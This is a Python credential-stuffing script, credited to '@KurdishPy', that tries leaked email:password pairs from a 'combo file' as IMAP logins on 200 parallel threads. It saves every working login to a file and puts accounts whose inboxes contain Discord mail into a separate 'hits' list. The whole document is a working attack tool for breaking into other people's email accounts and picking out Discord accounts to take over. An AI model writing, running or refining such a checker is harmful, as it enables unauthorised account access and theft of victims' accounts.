#!/usr/bin/env python3
"""
Discord.com Email Checker
-- @KurdishPy
"""

import imaplib
import sys
import re
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass
from typing import Optional, Tuple

# ANSI color codes
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
RESET = "\033[0m"

# Global stats (protected by lock)
@dataclass
class Stats:
    hits: int = 0
    bad: int = 0
    valid: int = 0

stats = Stats()
stats_lock = threading.Lock()
stop_flag = threading.Event()  # for graceful shutdown

def get_imap_server(email: str) -> Optional[str]:
    """Return imap server based on domain (naive)."""
    try:
        domain = email.split('@')[1]
        return f"imap.{domain}"
    except Exception:
        return None

def imap_login(email: str, password: str, server: str) -> Optional[imaplib.IMAP4_SSL]:
    """Attempt IMAP login, return connection if successful."""
    try:
        conn = imaplib.IMAP4_SSL(server, 993)
        conn.login(email, password)
        return conn
    except Exception:
        return None

def search_discord_email(conn: imaplib.IMAP4_SSL) -> bool:
    """Check if any email from noreply@discord.com exists in INBOX."""
    try:
        conn.select("INBOX")
        # Search for emails from noreply@discord.com
        status, data = conn.search(None, 'FROM', 'noreply@discord.com')
        if status != 'OK':
            return False
        # If any message IDs are returned, email exists
        return bool(data[0].split())
    except Exception:
        return False

def process_combo(email: str, password: str, out_hits, out_valid):
    """Test one email:password combo and update stats / files."""
    global stats
    server = get_imap_server(email)
    if not server:
        with stats_lock:
            stats.bad += 1
        return

    conn = imap_login(email, password, server)
    if not conn:
        with stats_lock:
            stats.bad += 1
        return

    # Login successful
    found = search_discord_email(conn)
    conn.logout()

    if found:
        # Hit: inbox contains Discord email
        with stats_lock:
            stats.hits += 1
        out_hits.write(f"{email}:{password}\n")
        out_hits.flush()
    else:
        # Valid: login OK but no Discord email found
        with stats_lock:
            stats.valid += 1
        out_valid.write(f"{email}:{password}\n")
        out_valid.flush()

def print_stats():
    """Display colored stats in a single line (overwrites previous line)."""
    sys.stdout.write(
        f"\r{GREEN}Hits:{stats.hits} {RESET}| "
        f"{RED}Bad:{stats.bad} {RESET}| "
        f"{YELLOW}Valid:{stats.valid}{RESET}   "
    )
    sys.stdout.flush()

def main():
    print(CYAN + "-- @KurdishPy || discord.com Checker" + RESET)
    combo_file = input(CYAN + "[×] Put combo file: " + RESET).strip()

    try:
        with open(combo_file, 'r', encoding='utf-8', errors='ignore') as f:
            combos = [line.strip() for line in f if line.strip() and ':' in line]
    except Exception as e:
        print(RED + f"Failed to read combo file: {e}" + RESET)
        sys.exit(1)

    if not combos:
        print(RED + "No valid combos found (need 'email:password' lines)." + RESET)
        sys.exit(1)

    # Open output files
    with open("Discord-Hits.txt", "w", encoding="utf-8") as out_hits, \
         open("Discord-Valid.txt", "w", encoding="utf-8") as out_valid:

        print(CYAN + f"Starting checker with {len(combos)} combos, max workers=200" + RESET)
        print_stats()

        with ThreadPoolExecutor(max_workers=200) as executor:
            futures = []
            for combo in combos:
                if stop_flag.is_set():
                    break
                parts = combo.split(':', 1)
                if len(parts) != 2:
                    continue
                email, password = parts
                futures.append(
                    executor.submit(process_combo, email, password, out_hits, out_valid)
                )

            # Monitor progress and update stats line
            for future in as_completed(futures):
                if stop_flag.is_set():
                    executor.shutdown(wait=False, cancel_futures=True)
                    break
                print_stats()

    print()  # newline after stats
    print(CYAN + "Done. Results saved to Discord-Hits.txt and Discord-Valid.txt" + RESET)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        stop_flag.set()
        print("\n" + YELLOW + "Interrupted by user." + RESET)
        sys.exit(0)